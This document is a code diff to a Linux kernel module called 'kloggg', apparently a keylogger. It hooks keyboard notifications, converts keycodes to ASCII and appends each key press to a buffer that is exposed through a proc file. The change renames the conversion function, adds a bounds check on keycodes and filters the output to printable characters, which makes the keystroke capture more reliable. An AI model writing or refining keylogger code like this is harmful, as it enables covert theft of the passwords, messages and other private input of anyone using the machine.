@@ -44,19 +44,28 @@ static struct proc_ops kloggg_fops = {
 };
 
 
-static char kloggg_keycode_to_symbol(unsigned int keycode, int shift_mask) {
-    u_short symbol;
-    if (shift_mask & (1 << KG_SHIFT)) {
-        symbol = shift_map[keycode];
-    } else {
-        symbol = plain_map[keycode];
-    }
+static char kloggg_keycode_to_ascii(unsigned int keycode, int shift_mask) {
+  u_short symbol;
 
-    if ((symbol >> 8) == 0) { // KT_ASCII
-        return symbol & 0xFF;
-    } else {
-        return '?'; // not a printable ASCII character
-    }
+  if (keycode >= NR_KEYS)
+    return '?'; // Invalid keycode
+
+  if (shift_mask & (1 << KG_SHIFT)) {
+    symbol = shift_map[keycode];
+  } else {
+    symbol = plain_map[keycode];
+  }
+
+  char c = symbol & 0xFF;
+
+  // Only return if it's printable ASCII
+  if (c >= 32 && c <= 126)
+    return c;
+
+  if (c == '\n' || c == '\t' || c == '\r')
+    return c;
+
+  return '?'; // Non-ASCII or control
 }
 
 static int kloggg_log(struct notifier_block *nb, unsigned long action, void *data) {
@@ -64,7 +73,7 @@ static int kloggg_log(struct notifier_block *nb, unsigned long action, void *dat
   if (action == KBD_KEYCODE && param->down) {
     unsigned int keycode = param->value;
     int shift_mask = param->shift;
-    char c = kloggg_keycode_to_symbol(keycode, shift_mask);
+    char c = kloggg_keycode_to_ascii(keycode, shift_mask);
     if (c < 128) {
       keybuf[keybuf_pos++] = c;
       if (keybuf_pos >= KEYBUF_LEN) {
